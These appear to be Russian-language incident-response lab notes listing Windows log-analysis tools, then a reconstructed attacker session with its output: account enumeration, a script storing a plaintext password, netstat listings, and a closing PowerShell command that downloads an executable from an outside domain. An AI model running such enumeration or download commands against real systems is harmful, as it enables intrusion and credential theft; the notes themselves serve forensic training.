- EvtxEcmd - утилита командной строки для парсинга логов в разных форматах таких как: CSV JSON XML и так далее.
- TimeLline Explorer - это GUI утилита которая работает как фильтр и навигатор по данным облегчая работу SOC по реагированию на инциденты с необработанными данными
- Sysmon view - GUI инструмент для визуализации логов sysmon
- chainsaw - анализатор логов винды в командной строке 


---
net localgroup administrators - Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
rimuru
The command completed successfully.

----
net user benimaru - User name                    benimaru
Full Name                    
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            6/20/2022 9:18:04 PM
Password expires             Never
Password changeable          6/20/2022 9:18:04 PM
Password required            No
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   6/21/2022 1:14:49 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use*Users                
Global Group memberships     *None                 
The command completed successfully.

---


dir C:\Users\benimaru - 

    Directory: C:\Users\benimaru


Mode                LastWriteTime         Length Name                                                                   
----                -------------         ------ ----                                                                   
d-r---        6/20/2022   4:13 PM                3D Objects                                                             
d-r---        6/20/2022   4:13 PM                Contacts                                                               
d-r---        6/21/2022  12:27 AM                Desktop                                                                
d-r---        6/20/2022   9:20 PM                Documents                                                              
d-r---        6/21/2022   1:13 AM                Downloads                                                              
d-r---        6/20/2022   4:13 PM                Favorites                                                              
d-r---        6/20/2022   4:13 PM                Links                                                                  
d-r---        6/20/2022   4:13 PM                Music                                                                  
dar---        6/21/2022   1:15 AM                OneDrive                                                               
d-r---        6/20/2022   4:13 PM                Pictures                                                               
d-r---        6/20/2022   4:13 PM                Saved Games                                                            
d-r---        6/20/2022   4:13 PM                Searches                                                               
d-r---        6/20/2022   5:57 PM                Videos 

---
dir C:\users\benimaru\Desktop - 

    Directory: C:\users\benimaru\Desktop


Mode                LastWriteTime         Length Name                                                                   
----                -------------         ------ ----                                                                   
-a----        6/20/2022  11:34 PM            268 automation.ps1                                                         
-a----        6/20/2022   4:13 PM           1446 Microsoft Edge.lnk 

---
cat C:\Users\Benimaru\Desktop\automation.ps1 - $user = "TEMPEST\benimaru"
$pass = "infernotempest"

$securePassword = ConvertTo-SecureString $pass -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $user, $securePassword

---

netstat -ano -p tcp - 
Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       864
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       5508
  TCP    0.0.0.0:5357           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4 - winrm
  TCP    0.0.0.0:7680           0.0.0.0:0              LISTENING       4964
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       476
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1212
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1760
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       2424
  TCP    0.0.0.0:49671          0.0.0.0:0              LISTENING       624
  TCP    0.0.0.0:49676          0.0.0.0:0              LISTENING       608
  TCP    192.168.254.107:139    0.0.0.0:0              LISTENING       4
  TCP    192.168.254.107:51802  52.139.250.253:443     ESTABLISHED     3216
  TCP    192.168.254.107:51839  34.104.35.123:80       TIME_WAIT       0
  TCP    192.168.254.107:51858  104.101.22.128:80      TIME_WAIT       0
  TCP    192.168.254.107:51860  20.205.146.149:443     TIME_WAIT       0
  TCP    192.168.254.107:51861  204.79.197.200:443     ESTABLISHED     4352
  TCP    192.168.254.107:51871  20.190.144.169:443     TIME_WAIT       0
  TCP    192.168.254.107:51876  52.178.17.2:443        ESTABLISHED     4388
  TCP    192.168.254.107:51878  20.60.178.36:443       ESTABLISHED     4388
  TCP    192.168.254.107:51881  52.109.124.115:443     ESTABLISHED     4388
  TCP    192.168.254.107:51882  52.139.154.55:443      ESTABLISHED     4388
  TCP    192.168.254.107:51884  40.119.211.203:443     ESTABLISHED     4388
  TCP    192.168.254.107:51895  52.152.90.172:443      ESTABLISHED     5508
  TCP    192.168.254.107:51896  20.44.229.112:443      ESTABLISHED     8904

---
powershell iwr http://phishteam.xyz/02dcf07/ch.exe -outfile C:\Users\benimaru\Downloads\ch.exe - 

